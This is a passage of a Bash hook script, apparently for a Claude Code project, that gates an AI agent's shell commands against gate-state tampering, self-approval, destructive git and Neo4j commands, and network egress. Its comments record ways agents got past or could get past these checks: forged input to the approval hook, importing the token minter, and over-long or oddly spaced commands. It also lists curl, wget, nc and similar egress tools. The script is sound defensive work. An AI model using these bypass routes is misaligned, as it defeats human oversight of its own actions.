#   3. SPACE RUNS COLLAPSE, which is required rather than tidy. `git reset --hard`,
#      `git tag -d `, `git branch -D`, `docker exec`, `docker compose exec`, `sed -i` and
#      `sed --in-place` each need exactly one space, and `git<TAB><TAB>commit` and
#      `git  reset  --hard` are legal shell that one space does not match. The mechanism
#      is an IFS word split and rejoin: ONE PASS, forking nothing, which is the per-call
#      cost claim tests/test_bash_pattern_spelling_gate.py pins on this marker block.
#
#      IT WAS A FIXED-POINT LOOP FIRST, and that was quadratic in the longest whitespace
#      run: review MEASURED `while [[ "$CMD_N" == *"  "* ]]` at 0.03s for 10,000
#      consecutive spaces, 0.46s at 40,000 and 1.88s at 80,000, on EVERY Bash call,
#      before any guard. A heredoc or a pasted blob reaches that size without trying, so
#      it was a hang the user would feel and, if the hook harness times out and fails
#      open, a bypass of every guard here. The single pass does 400,000 spaces in 0.03s.
#
#      THE ORDER OF THE TWO LINES BELOW IS LOAD-BEARING. `read -ra` reads ONE LINE, so on
#      raw input it would TRUNCATE a multi-line command and blind every guard after the
#      first newline, which is why the plan rejected it. That objection dies once the
#      line above has already turned every newline into a space: by the time `read` runs
#      there is no newline left to stop at. Swapping these two lines reintroduces the
#      truncation. `extglob` (a `+( )` class) is the other alternative, enabled nowhere
#      in this repo, and turning it on changes pattern semantics for every `case` here.
#
# NOT HANDLED, so the normalization is not read as wider than it is: backslash escaping
# (`c\p`, `git\ reset`), ANSI-C quoting (`cp$'\x20'x`), and the mid-word quote splits
# (`"c"p`, `c"p"`) on the write and egress path, which reach the extractor once normalized
# and die there on `shlex.split(posix=False)`. Each needs the per-verb token walk this
# layer deliberately does not attempt, and each is pinned as a strict xfail rather than
# left to be rediscovered.
# CMD NORMALIZATION BEGIN
CMD_N="${CMD//[$'\t\n']/ }"
CMD_N="${CMD_N//[$'\x22\x27']/}"
read -ra _cmd_words <<< "$CMD_N"
CMD_N="${_cmd_words[*]}"
# CMD NORMALIZATION END

# Gate state is protected by a blanket path check BEFORE the write-verb early exit
# below, and it STAYS ahead of everything: it asks only whether the command TEXT names
# a protected path, so it needs no write verb, no interpreter it recognizes and no
# path shape at all. The extractor's own vectors are narrower by necessity -- the
# shell write forms (>, cp, mv, tee, sed -i) plus the inline-interpreter scan added
# below -- so an interpreter one-liner it does not recognize (a wrapper script, a path
# in a variable) would still reach the file. Naming gate state is therefore refused
# outright unless the command is provably read-only (below).
# The minter is a plain script, so the agent running it directly would forge a
# grant that is indistinguishable from a real one in the audit trail. Naming it in
# an executable position is refused; only the harness may invoke it as a hook.

# Provably read-only inspection: the blanket guard used to refuse even `grep` of
# audit logs whose ROWS name the minter, which blocked diagnosis of the very state
# it protects. A command passes ONLY when it cannot execute, expand, or write:
# no substitution/expansion/control/redirect characters anywhere, and every
# pipeline segment starts with a read-only inspector. Interpreters, find/xargs/awk
# (exec-capable), sed (its `w` command writes), sort (-o writes), rg (--pre
# executes) and file (-C compiles to disk) stay excluded, so the minter and the
# store remain un-invocable and un-writable through this allowance.
#
# ALWAYS CALLED ON THE RAW COMMAND, never on the normalized copy, and that is a
# load-bearing decision rather than an oversight. This function asks what a command CAN
# DO, so it is the one ALLOW arm on the two guards that protect execution vectors.
# Removing quote characters first would make MORE commands qualify as read-only
# inspection (a quoted verb like `"cat"` would resolve), which LOOSENS that arm, and an
# allow-side test cannot see a new allow, so a loosening belongs in a cycle that can
# measure the allow side. The cost is stated rather than discovered later: the guards
# above and below now match more spellings, so a quoted-verb inspection naming gate state
# (`"cat" writ-grant-x.json`) is REFUSED where the bare `cat` spelling is allowed. That
# asymmetry is fail-closed, the Read tool covers it, and a test pins it deliberately.
_readonly_inspection() {
    case "$1" in
        *'$('* | *'${'* | *'`'* | *';'* | *'&'* | *'>'* | *'<'* | *$'\n'*) return 1 ;;
    esac
    # $NAME / $1 variable expansion (a trailing regex '$' has no name char after it).
    printf '%s' "$1" | grep -qE '\$[[:alnum:]_]' && return 1
    local _segs _seg _verb
    IFS='|' read -ra _segs <<< "$1"
    for _seg in "${_segs[@]}"; do
        _seg="${_seg#"${_seg%%[![:space:]]*}"}"
        _verb="${_seg%%[[:space:]]*}"
        case "${_verb##*/}" in
            grep|egrep|fgrep|cat|head|tail|wc|cut|tr|uniq|nl|ls|stat|diff|cmp|md5sum|sha256sum|strings|column|jq) ;;
            *) return 1 ;;
        esac
    done
    return 0
}

STATE_DIR_GUARD="${WRIT_CACHE_DIR:-$WRIT_DIR/var/session}"

# The minter's own TEST FILE is not the minter. The grant module's name is a
# module name, so it matched the test file named after it as readily as the
# module itself under bin/lib/, and a pytest run naming that test file was
# refused -- measured roughly eight times in one session, twice on commands whose
# only purpose was probing this behaviour. A test file cannot mint a grant, and
# anything it might WRITE is still covered by the grant-file patterns below, so
# the test file's name is scrubbed before matching rather than the module pattern
# being dropped. Scrubbing, not exempting: a command naming the test file AND the
# module still matches on the module.
#
# NORMALIZE FIRST, SCRUB SECOND, and the order is the point: a quoted spelling of the test
# file name (`"test_manual_test_grant.py"`) has to collapse before the scrub can find it,
# or the one named exemption stops applying to the spellings the fix newly matches.
# This guard takes the NORMALIZED copy because it is the ONLY layer protecting an
# EXECUTION vector: the extractor classifies write TARGETS and never sees an attempt to
# RUN the minter, so a miss here is the whole decision. All ten patterns below are
# quote-free single tokens with no internal space, so normalization can only ADD matches,
# and the mid-identifier quote split (`auto-approve"-"gate`) is therefore closed HERE,
# unlike the write-side `"c"p`, which reaches the extractor and dies there instead.
CMD_FOR_STATE_MATCH="${CMD_N//test_manual_test_grant.py/}"

# WHICH pattern matched is recorded, because the refusal used to interpolate
# $STATE_DIR_GUARD unconditionally: a command matching the grant module was told
# it "names Writ gate state ('<...>/var/session')" when it had named no such
# path. That misdirection, not the breadth of the match, is why the false
# positive above went unexplained for so long -- every refusal pointed the reader
# at the wrong pattern.
# `reopen-planning` is the subcommand that returns a work session to planning and CLEARS
# both approved gates. It belongs on this list rather than in a code comment: the whole
# point of the phrase is that only the USER can spend it, and the approval hook mints and
# claims that token inside one process, so no legitimate agent invocation exists. Refusing
# the command TEXT is what makes "the agent never resets its own phase" mechanical.
#
# The HYPHEN is load-bearing. This pattern is a raw substring match, so the underscored
# test path tests/test_replan_reopen_planning.py does not match it and a pytest command
# naming that file stays runnable -- which is exactly why that file is named that way. The
# cost, shared with every other pattern here, is that a command merely MENTIONING
# reopen-planning is refused unless it is provably read-only inspection, so this file and
# any doc discussing the subcommand must be edited with the Edit tool, never a heredoc.
STATE_MATCH=""
# `auto-approve-gate` is THE HOOK THAT MINTS, and refusing the subcommand was not enough.
#
# Found by the reviewer and reproduced: an agent that never types `reopen-planning` can run
# `bash hooks/scripts/auto-approve-gate.sh` with a forged
# {"session_id": ..., "prompt": "replan approved"} on stdin. The hook mints a token and
# claims it in the same process, so the reset completed with no human turn at all, and the
# hook's own reply said "no agent self-approval" while an agent did exactly that. Guarding
# the CLI subcommand closed the front door and left the hook itself open.
#
# It is the only hook that mints (2 call sites of write_gate_token_file; the bash and state
# write gates have none, and the manual-test-grant hook is already on this list), so this one
# name closes the whole class: the pre-existing exact-tier `approved` advance is minted by the
# same script and becomes unreachable from Bash by the same pattern.
#
# THE COST, stated because it is real: a hook cannot be verified by triggering it from Bash
# any more, and that is this repo's most reliable verification method. Tests still run it as
# a subprocess (pytest is not gated), which is where that verification now belongs.
#
# The PYTHON API is the last pattern here, and it closes the bypass the CLI token gate
# would otherwise leave wide open. `writ review <rule_id> --promote` now requires the
# approval token, so the cheapest remaining route to an unapproved authority change is for
# the agent to mint its own: one `python3 -c` importing the minter straight out of
# writ.session.gate_token. The three names above guard the SCRIPT and the SUBCOMMAND; the
# underscored module symbol was on neither list, so the guard was blind to the API. The
# script and the API are two doors into one act, and refusing one of them is refusing
# neither.
#
# FALSE-POSITIVE ANALYSIS, per this file's own hyphen lesson: the pattern is a raw
# substring match on command text, no test file is NAMED after the symbol, and a pytest
# invocation naming any of this cycle's test files (test_review_promote_authority.py,
# test_gate_token_binding.py, test_approval_evidence.py) does not contain it, so the suite
# stays runnable. The cost is the one every pattern here carries: a Bash command that
# merely mentions the symbol is refused unless it is plain read-only inspection, so prose
# naming it goes through a file with `git commit -F <file>`.
for _state_pat in "$STATE_DIR_GUARD" "/tmp/writ-current-session" "writ-session-" \
                  "writ-manual-test-grant" "manual_test_grant" "writ-grant-" \
                  "writ-gate-token" "reopen-planning" "auto-approve-gate" \
                  "mint_gate_token"; do
    case "$CMD_FOR_STATE_MATCH" in
        *"$_state_pat"*) STATE_MATCH="$_state_pat"; break ;;
    esac
done

case "$STATE_MATCH" in
    ?*)
        if _readonly_inspection "$CMD"; then
            log_gate_decision "bash-write" "allow" "read-only inspection naming gate state" ""
        else
            GUARD_REASON="[ENF-GATE-STATE] Refusing this Bash command: it names Writ gate state ('$STATE_MATCH'). Mode, approvals, the manual-testing grant and recorded review verdicts live there, and a gate the agent can edit is not a gate, so a command that could execute, expand, or write is refused in any mode. Plain read-only inspection (grep/cat/ls pipelines with no redirects, substitution, or control operators) is allowed, and the Read tool covers the rest. To write PROSE that merely names gate state (a commit message, a doc, a plan), put the text in a file with the Write tool and pass the file: 'git commit -F <file>' rather than 'git commit -m'. The match is on the command TEXT, so a mention inside an argument reads exactly like a use, and this is the seam that separates them. A manual-testing bypass is minted only from the user's own words: ask the user to reply \"manual testing approved\". A CRITICAL review verdict is cleared only by fixing the findings and re-running writ-reviewer, never by writing the record directly."
            log_gate_decision "bash-write" "deny" "$GUARD_REASON" "$STATE_MATCH"
            emit_deny "$GUARD_REASON"
            exit 0
        fi
        ;;
esac

# ── Fourth vector: IRREVERSIBLE DESTRUCTION ─────────────────────────────────
# AIMED AT WHAT ACTUALLY DESTROYED STATE HERE, not at the verbs that sound dangerous.
# Two incidents:
#   2026-08-05  invoking benchmarks/*.py blind wiped the graph.
#   2026-08-08  a docker exec at target resolution wiped it again, and the tripwire in
#               place missed it because it watched CONNECTIONS.
# Neither is rm -rf, reset --hard, clean -fd, a force push, DROP TABLE or TRUNCATE, which
# is the canonical list. 46 python files carry DETACH DELETE today.
#
# DENY, NOT ASK. Claude Code already prompts for anything outside its allowlist, so an ask
# here is a second prompt for one action. What that layer cannot do is notice
# reversibility: one Bash(git push:*) allowlist entry covers --force forever.
#
# THE CLEARANCE IS THE USER'S OWN HANDS: the refusal tells the agent to have the user run
# it with a leading exclamation mark in the prompt. No new grant type, and deliberately NOT
# the manual-testing grant, which means "manual testing" rather than "destroy this".
#
# rm -rf, DROP TABLE and TRUNCATE are OUT OF SCOPE on purpose: no incident, Claude Code
# already prompts, and each one widens the false-positive surface on scratch work.
#
# CONSEQUENCE, same as the gate-state guard above: a Bash command that merely NAMES one of
# these patterns is refused unless it is plain read-only inspection, so this file and any
# doc discussing the patterns must be edited with the Edit tool rather than a heredoc. That
# bit immediately: the command adding an example refusal message to this very block was
# refused by the block itself.
_IRREV_CYPHER_RE='detach[[:space:]]+delete|match[[:space:]]*\([[:alnum:]_]*\)[[:space:]]*delete|drop[[:space:]]+constraint|drop[[:space:]]+index'

# The project-local .py a python interpreter would RUN, or nothing.
#
# -m and -c disqualify the whole command: -m pytest is the suite (one of its tests
# legitimately wipes the shared graph and restores it through migrate.py, so refusing
# pytest would stop the suite), and -c is inline code, already the third vector above.
_irrev_script_target() {
    local cmd="$1"
    case " $cmd " in *" -m "*|*" -c "*) return 0 ;; esac
    local -a toks; read -ra toks <<< "$cmd"
    local n=${#toks[@]} i j
    for ((i = 0; i < n; i++)); do
        case "${toks[i]##*/}" in
            python|python3|python3.*|pythonw) ;;
            *) continue ;;
        esac
        for ((j = i + 1; j < n; j++)); do
            case "${toks[j]}" in
                -*) continue ;;
                *.py) printf '%s' "${toks[j]}"; return 0 ;;
                *) break ;;
            esac
        done
    done
    return 0
}

# A reason to refuse, or nothing. Read-only inspection is exempt FIRST: planning the cycle
# that added this guard needed three greps for DETACH DELETE, and a guard that refuses
# those makes the codebase unsearchable. Same escape the gate-state guard uses.
#
# TWO SPELLINGS ARE PASSED IN, and the split is per CONSUMER rather than per function.
# $1 is the RAW command; $2 is the normalized copy. This site has NO second layer, so a
# missed spelling is a complete pass-through of a destructive command, which is why every
# phrase match here reads $2:
#   - `_readonly_inspection` takes $1. See its own header for why the raw text is the
#     load-bearing choice there.
#   - `lower` is folded from $2, so every arm below that needs exactly one space
#     (`docker exec`, `docker compose exec`, `git reset --hard`, `git tag -d `) sees a tab,
#     a quoted verb and a doubled space the way a shell would.
#   - the case-SENSITIVE `git branch -D` arm reads $2 as well. Normalization only
#     translates whitespace and drops quote characters, so it preserves case and cannot
#     turn `-D` into `-d`.
#   - `_irrev_script_target` takes $2 for a second reason beyond the space. Its `read -ra`
#     reads ONE LINE, so a script invoked on the second line of a multi-line command was
#     never walked at all; the newline translation flattens that before it is called. And
#     the quote removal is what makes `python3 "benchmarks/bench_targets.py"` walkable,
#     since the raw token ends in a quote character and never matches the `*.py` glob, so
#     the script's content was never read.
# RESIDUE, disclosed rather than patched spelling by spelling, because each needs a
# per-verb argument walk instead of a phrase match: an interposed global flag
# (`git -C /tmp reset --hard`), reordered flags (`git reset HEAD~1 --hard`), an
# abbreviated long flag (`git reset --har`), an alias or wrapper script, and a value
# assembled from a variable (`V=--hard; git reset $V`). The first two are pinned as
# strict xfails in tests/test_bash_pattern_spelling_gate.py.
_irreversible_reason() {
    local cmd="$1" norm="$2" lower
    _readonly_inspection "$cmd" && return 0
    lower="${norm,,}"

    # 1. Graph destruction through a container or a shell (the 2026-08-08 vector). BOTH a
    #    graph-reaching verb AND a destructive statement are required, so writing prose
    #    that merely contains the statement is not caught.
    case "$lower" in
        *"docker exec"*|*"docker compose exec"*|*"docker-compose exec"*|*"cypher-shell"*)
            if [[ "$lower" =~ $_IRREV_CYPHER_RE ]]; then
                printf '%s' "[ENF-IRREVERSIBLE] Refusing this Bash command: it reaches Neo4j with a destructive statement (DETACH DELETE, MATCH ... DELETE, DROP CONSTRAINT or DROP INDEX). That is how the graph was wiped on 2026-08-08, and it is not recoverable from here. If it is genuinely intended, ask the user to run it themselves by prefixing it with ! in the prompt, so a human owns the destruction. Reading the graph is fine: a RETURN query, or the /explore page."
                return 0
            fi
            ;;
    esac

    # 2. Graph destruction through a script (the 2026-08-05 vector). Nothing in the command
    #    text says the script wipes the graph, so the FILE decides. One bounded read and no
    #    external process: the $(<file) form is a builtin.
    local script; script="$(_irrev_script_target "$norm")"
    if [ -n "$script" ] && [ -f "$script" ]; then
        local body; body="$(<"$script")"
        if [[ "${body,,}" =~ $_IRREV_CYPHER_RE ]]; then
            printf '%s' "[ENF-IRREVERSIBLE] Refusing this Bash command: it invokes ${script}, which contains a destructive Neo4j statement (DETACH DELETE, DROP CONSTRAINT or DROP INDEX). Invoking a script like this blind is how the graph was wiped on 2026-08-05, and nothing in the command text says it would. If it is genuinely intended, ask the user to run it themselves by prefixing it with ! in the prompt. Running the same file under pytest is not gated."
            return 0
        fi
    fi

    # 3. Git history destruction. No incident, but this branch carries dozens of unpushed
    #    commits, so a hard reset is the live exposure. --force-with-lease is ALLOWED: it is
    #    the reversible form, and refusing it pushes people toward the unsafe spelling.
    local git_match=""
    case "$lower" in
        *"git reset --hard"*) git_match="git reset --hard" ;;
        *"git tag -d "*)      git_match="git tag -d" ;;
    esac
    # Case-SENSITIVE on purpose (`-D` deletes unmerged, `-d` refuses to), so it cannot
    # read `lower`. It reads the normalized copy instead: normalization touches only
    # whitespace and quote characters, so case survives it intact.
    case "$norm" in *"git branch -D"*) git_match="git branch -D" ;; esac
    case "$lower" in
        *"git clean"*) case "$lower" in *" -f"*) git_match="git clean -f" ;; esac ;;
    esac
    case "$lower" in
        *"git push"*)
            case "$lower" in
                *"--force-with-lease"*) ;;
                *"--force"*|*" -f "*|*" -f") git_match="git push --force" ;;
            esac
            ;;
    esac
    if [ -n "$git_match" ]; then
        printf '%s' "[ENF-IRREVERSIBLE] Refusing this Bash command: ${git_match} destroys git history or refs, and this branch carries unpushed work that exists nowhere else. If it is genuinely intended, ask the user to run it themselves by prefixing it with ! in the prompt. The reversible forms are allowed: --soft, --force-with-lease, git clean -n, and git branch -d."
        return 0
    fi
    return 0
}

IRREV_REASON="$(_irreversible_reason "$CMD" "$CMD_N")"
if [ -n "$IRREV_REASON" ]; then
    log_gate_decision "irreversible" "deny" "$IRREV_REASON" ""
    emit_deny "$IRREV_REASON"
    exit 0
fi

# Cycle 9 -- the third vector: a commit that would land work a reviewer rejected.
# agents/writ-reviewer.md already declares "Critical blocks merge"; nothing enforced
# it, because the verdict reached only the agent whose code was reviewed, which is
# the author adjudicating the critic. writ-subagent-stop.sh records the verdict at
# SubagentStop; this arm confirms with the HUMAN before the commit.
#
# ASK, never deny: a deny needs an override, and any override this agent could set
# re-opens the exact defect being closed. Routing to the human is the point.
#
# Placed BEFORE the cheap early-exit below, which would otherwise exit 0 on a commit
# (it matches write operators and egress verbs only). Costs one case match on every
# Bash call and one python spawn on commits alone.
#
# COVERAGE LIMIT, in the same spirit as the write and egress limits above: this
# matches the literal `git commit` spelling, including after global flags
# (`git -C dir commit`). A commit issued through an alias, a wrapper script, or a
# variable is not seen. The gate is a confirmation prompt on the ordinary path, not
# a containment boundary against a determined caller.
#
# The case arm is a cheap PREFILTER only. It is a raw substring match, so it also
# fires on `grep "git commit" file`, and a false ask is user-visible friction, not
# a harmless extra spawn. The grep below re-checks that `git ... commit` actually
# starts a command (start of string, or after ; & | && ||), which a quoted mention
# inside another command's arguments does not.
# Provenance for the reviewer-verdict record. A recorded CRITICAL verdict is what
# makes the commit arm below fire, so an agent that can write that record can clear
# its own block, which is the defect this whole mechanism exists to close. The
# ordinary ways to do that are this module's `record` subcommand and a POST to
# /session/{sid}/review-findings; both are refused here, the same way the
# manual-testing grant minter is.
#
# DELIBERATELY NARROWER than the state-dir guard above, which refuses any mention of
# gate state. This file must stay stageable, greppable and committable
# (`git add bin/lib/review_findings.py` is legitimate and common), so only MUTATING
# use is refused: the `record` subcommand, or a POST-shaped request to the endpoint.
#
# HONEST LIMIT: this is a command-text check, so it is a confirmation boundary and
# not containment. An agent that writes an intermediate script and runs that is not
# stopped, and no in-repo secret would help because the agent can read the repo.
# What closes the loop is the review_block_lifted audit event plus the human at the
# commit prompt. Same posture the rest of this file documents for its own vectors.
#
# STAYS ON THE RAW COMMAND. The outer glob needs no adjacent space and the inner regex is
# already `[[:space:]]`-based, so no measured spelling is blind at this site and there is
# nothing for normalization to buy.
case "$CMD" in
    *"review_findings"* | *"review-findings"*)
        if printf '%s' "$CMD" | grep -qE \
            'review_findings(\.py)?[[:space:]]+record|review-findings.*(POST|--data|-d[[:space:]])'; then
            RECORD_REASON="[ENF-GATE-STATE] Refusing this Bash command: it writes a reviewer verdict directly. That record is what makes the commit gate fire, so an agent that writes it can clear its own CRITICAL findings, which is exactly the review this gate exists to enforce. Verdicts are recorded by writ-subagent-stop.sh from the reviewer's own output. To clear a block: fix the findings and re-run writ-reviewer. Reading the record is fine (GET, or the Read tool)."
            log_gate_decision "review-record" "deny" "$RECORD_REASON" ""
            emit_deny "$RECORD_REASON"
            exit 0
        fi
        ;;
esac

# The daemon's arbitrary-key setter. POST /session/{id}/update was
# `cache[key] = value` with no auth and no key allowlist, so it could write the gate
# inputs `mode` and `current_phase`; it was deleted (writ/server/routes/session_state.py)
# because it had no callers. This arm is what stops it coming back silently: the route
# reappearing would otherwise be reachable from Bash on day one, the same way it was
# reachable before anyone noticed it existed.
#
# SCOPED TO THE SETTER PATH, not to session-state POSTs generally. The agent's own
# legitimate calls are session-state POSTs (quality-judgment, verification-evidence,
# context-percent are all agent-initiated by design), so a blanket refusal would need a
# list of exceptions, which is the blocklist shape ABS-SECURITY-024 rejects.
#
# HONEST LIMIT, same as the arms above: a command-text check is a confirmation boundary,
# not containment. An agent that writes an intermediate script and runs that is not
# stopped. What closes the loop is the route being gone.
#
# STAYS ON THE RAW COMMAND, and here the normalized copy would actively BREAK it: the
# regex's character classes literally CONTAIN the quote characters
# (`[^[:space:]"']*`), so feeding quote-stripped text changes what the pattern means. The
# outer glob needs no adjacent space either.
case "$CMD" in
    *"/update"*)
        # A SCHEME IS REQUIRED, and that is not cosmetic. The first draft matched the
        # bare path, which also matched the literal `/session/{session_id}/update`
        # sitting in a test file's frozen route list, so editing the very test that
        # pins this route's removal was refused. That is the same
        # mention-versus-use confusion the state-dir arm had, reintroduced by the
        # commit that fixed it. Requiring http:// or https:// means only something
        # shaped like an actual request matches; a quoted template does not.
        if printf '%s' "$CMD" | grep -qE \
            'https?://[^[:space:]"'"'"']*/session/[^/[:space:]"'"'"']+/update'; then
            UPDATE_REASON="[ENF-GATE-STATE] Refusing this Bash command: it posts to the session-cache key setter. That route wrote any string-valued key of the session cache, including the gate inputs \`mode\` and \`current_phase\`, so a caller could advance a phase or disable the work-mode gates without an approval. It has been removed from the daemon; a command still addressing it is either stale or an attempt to write gate state by another door. Reading session state is fine (GET, or the Read tool)."
            log_gate_decision "session-update" "deny" "$UPDATE_REASON" ""
            emit_deny "$UPDATE_REASON"
            exit 0
        fi
        ;;
esac

_GIT_COMMIT_RE='(^|[;&|]|&&|\|\|)[[:space:]]*([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*[[:space:]]+)*(env[[:space:]]+|command[[:space:]]+|sudo[[:space:]]+|nohup[[:space:]]+)*git([[:space:]]+-[^[:space:]]+([[:space:]]+[^[:space:]-][^[:space:]]*)?)*[[:space:]]+commit([[:space:]]|$)'

# THE OUTER ARM READS THE NORMALIZED COPY, THE INNER GREP KEEPS THE RAW COMMAND, and the
# second half is a regression this fix would otherwise introduce. The arm is a substring
# match needing one literal space, so `git<TAB>commit` opened nothing; on the normalized
# copy it opens, and the inner regex is already `[[:space:]]+`-based, so it then matches
# the tab spelling on the raw text with no change. But grep is LINE ORIENTED and that
# regex anchors on `(^|[;&|]|&&|\|\|)`, so feeding it newline-flattened text would stop
# matching a `git commit` that begins the SECOND line of a multi-line command, turning a
# working ask into silence. Routing the inner grep onto the normalized copy would also
# start matching `echo "; git commit"`, and a false ask at this site is user-visible
# friction by this arm's own recorded standard.
case "$CMD_N" in
    *"git commit"* | *"git -"*" commit"*)
        if printf '%s' "$CMD" | grep -qE "$_GIT_COMMIT_RE"; then
            # `check` exits 1 and prints the reason when blocking, 0 and silent when
            # not. Written as an `if` rather than `cmd && VAR=""` because the latter
            # leans on set -e's "failing left side of &&" exemption to not kill the
            # hook. A crash (missing interpreter, unreadable cache) leaves this empty
            # and the commit proceeds: this arm is a confirmation prompt, and the
            # hook's fail-open posture for infrastructure faults is deliberate.
            if REVIEW_BLOCK=$(python3 "$WRIT_DIR/bin/lib/review_findings.py" check "$SESSION_ID" 2>/dev/null); then
                REVIEW_BLOCK=""
            fi
            if [ -n "$REVIEW_BLOCK" ]; then
                ASK_REASON="[Writ] The reviewer left $REVIEW_BLOCK. Committing lands work the review rejected. Fix the findings and re-run writ-reviewer to clear this (a fresh clean verdict lifts it), or confirm to commit anyway."
                log_gate_decision "review-blocking" "ask" "$ASK_REASON" ""
                emit_ask "$ASK_REASON"
                exit 0
            fi
        fi
        ;;
esac

# Cheap hot-path early-exit: a command with neither a write operator nor an egress
# verb (the vast majority -- ls, git, grep, test runs) never spawns the python
# extractor. Loose on purpose (a stray match only costs one spawn, never a false deny
# or a false ask -- the extractor decides).
#
# MATCHED AGAINST THE NORMALIZED COPY, because this arm's `*) exit 0` default is the whole
# hole: a miss exits BEFORE the extractor, which is the only place credential-write,
# gate-state-write, out-of-project-write and egress decisions are made. Every verb glob
# below wants one literal space, so a tab, a quoted verb or a doubled space skipped the
# extractor entirely. No pattern here contains a quote character, so quote removal cannot
# unmatch any of them, and the widening is free in VERDICT terms rather than merely cheap:
# the consumer below starts with `[ -z "$TARGETS" ] && exit 0`, and every deny and ask
# past it is driven by a ROW the extractor emitted, so nothing downstream reads "the
# prefilter matched" as evidence. The price of a newly matched command is one python start
# plus one `$(pwd)` subshell, and the newly matched class is narrow: a quoted token ending
# in a write or egress verb with another word after it (`git commit -m "cp fix"`), plus
# doubled-space and tab spellings. The `pytest*` arm is prefix-anchored and exits 0 either
# way, so a newly matching spelling there changes nothing but which line exits.
#
# The marker block is what tests/test_bash_pattern_spelling_gate.py DERIVES its population
# from: it parses every `*"..."*` literal between the markers and keeps the ones containing
# a space, which is precisely the vulnerable shape. A verb glob added here without a probe
# reddens that test instead of sitting outside a stale list, so the markers must wrap this
# arm's literals and nothing else.
case "$CMD_N" in
    # PREFILTER PATTERNS BEGIN
    *">"* | *"tee "* | *"dd "* | *"cp "* | *"mv "* | *"install "* \
    | *"sed -i"* | *"sed --in-place"* | *"--in-place"* | *"--target-directory"* \
    | *"wget "* | *"scp "* | *"rsync "* | *"sftp "* | *"gist "* \
    | *"nc "* | *"ncat "* | *"netcat "* | *"telnet "* | *"curl "* ) ;;
    # PREFILTER PATTERNS END
    pytest*|"python -m pytest"*|"python3 -m pytest"*)
        # Interpreter force-swap: when the project has a venv, a bare pytest /
        # python3 -m pytest runs the SYSTEM interpreter and fails on venv-only
        # deps (measured here: 21 spurious embedding-test errors). Rewrite the
        # command via updatedInput and disclose the rewrite in additionalContext
        # so the model's narration matches what actually ran. Write-redirecting
        # pytest commands (pytest > log) hit the arm above instead and stay gated.
        if [ -x ".venv/bin/python" ]; then
            SWAP=$(WRIT_PARSED_ENVELOPE="$HOOK_ENVELOPE" python3 <<'PYSWAP' 2>/dev/null
import json, os, re, sys
try:
    parsed = json.loads(os.environ.get("WRIT_PARSED_ENVELOPE", ""))
except (json.JSONDecodeError, ValueError):
    sys.exit(0)
ti = parsed.get("tool_input") or {}
cmd = ti.get("command") or ""
new = re.sub(r"^(?:python3?\s+-m\s+)?pytest\b", ".venv/bin/python -m pytest", cmd, count=1)
if new == cmd:
    sys.exit(0)
ti["command"] = new
print(json.dumps({"hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "allow",
    "updatedInput": ti,
    "additionalContext": (
        "[Writ] Rewrote this Bash command to the venv interpreter "
        "(a bare pytest here runs the system python, which lacks this "
        f"repo's test deps). Actually ran: {new}"
    ),
}}))
PYSWAP
) || true
            if [ -n "$SWAP" ]; then
                log_gate_decision "bash-venv-swap" "allow" "pytest routed to .venv/bin/python -m pytest" ""
                emit_hook_reply "$SWAP"
            fi
        fi
        exit 0
        ;;
    *python*|*node*|*perl*|*ruby*|*php*)
        # Inline-code interpreters (see INLINE_INTERPRETERS in the extractor). TWO
        # stages, because an interpreter NAME alone is not worth a spawn: `ls
        # node_modules`, `php artisan migrate` and `python3 script.py` are not this
        # vector. The second glob requires something shaped like an inline-code flag
        # (`-c`, `-e`, `-E`, `-r`, `-p`, `--eval`, `--print`, each with the space that
        # precedes a real flag) or a stdin form (`<`, `<<`, a bare `-`, or a pipe, which
        # is how `printf '...' | python3` feeds an argument-free interpreter). Both
        # stages are loose on purpose -- a stray match costs one spawn and the extractor
        # decides -- and both are substring globs, so a quoted mention reaches the
        # extractor too. The pipe pattern is the widest: an interpreter command with a
        # pipe in it pays one spawn even when it writes nothing. That is the price of
        # not being blind to the one stdin form that carries no marker at all.
        # Placed AFTER the pytest arm so `python3 -m pytest` still gets the venv swap.
        #
        # THE SECOND STAGE READS THE NORMALIZED COPY, for the same reason the arm above
        # does: its own `*) exit 0` is a fail-open past the extractor. Stage 1 is
        # whitespace-blind already (`*python*` needs no separator), so the miss was
        # entirely here, where every flag glob carries the space that precedes a real
        # flag: `python3<TAB>-c "open('src/x.py','w')"` cleared stage 1 and exited at
        # stage 2's default. MEASURED, not predicted: both spellings are pinned in
        # tests/test_bash_pattern_spelling_gate.py against the same verdict.
        case "$CMD_N" in
            *" -c"* | *" -e"* | *" -E"* | *" -r"* | *" -p"* \
            | *"--eval"* | *"--print"* | *"<"* | *" - "* | *" -" | *"|"*) ;;
            *) exit 0 ;;
        esac
        ;;
    *) exit 0 ;;
esac

# Extract write targets (shell vectors AND inline-interpreter arguments) plus egress
# destinations in ONE python spawn.
# Output lines: "<kind>\t<path>" where kind is `cred` (credential, deny everywhere),
# `state` (Writ gate state, deny everywhere), `local` (an abspath under cwd) or `outside`
# (an abspath that is not). `local` and `outside` are BOTH work-gated by the same
# can-write round trip; the kinds stay distinct so the row still says where the path was.
# Plus "unknown\t<spelling>\t<variable>" per target whose expansion could not be resolved
# (it ASKS; it produces no local/outside row, because there is no path to gate), and
# "egress\t<host>\t<detail>" per non-allowlisted destination.
#
# THE EXTRACTOR GETS THE RAW COMMAND, and this is the most important non-regression on the
# normalization path. Redirect detection here is quote-AWARE by design:
# `shlex.split(posix=False)` keeps the quote characters on tokens, which is what stops
# `grep '>' app.pem` being read as a redirect into a credential file. Feeding the
# normalized copy in would strip those quotes, put a bare `>` in redirect position, and
# turn that read-only grep into a `[SEC-CREDENTIAL-WRITE]` deny. The existing pins for
# that behavior go through the extractor directly and so are structurally blind to this
# mutation, which is why the pin for it drives the REAL hook instead.
#
# THE COMMAND CROSSES AS A PATH, NOT AS A VALUE, and this is the whole gate's
# availability rather than a refactor. `WRIT_BASH_CMD="$CMD"` put the model-controlled
# command in ONE environment string, and Linux caps a single argv/env string at
# MAX_ARG_STRLEN (32 pages, 131,072 bytes here). Measured on this machine: a credential
# probe of 131,014 characters DENIED and one of 131,060 was SILENT, rc 0. execve failed
# before python started, `2>/dev/null || true` swallowed it, TARGETS came back empty, and
# the consumer below read that as "nothing to gate". Every arm past this line (credential,
# gate state, work gate, unresolved target, egress) was switched off by command LENGTH.
# See docs/adr/ADR-hook-exec-argument-boundary.md, which decides this class.
#
# A FILE PATH IS BOUNDED BY CONSTRUCTION, which is the enforcer the ADR asks to be named:
# it is built from a fixed `mktemp` template, so its size cannot depend on the payload.
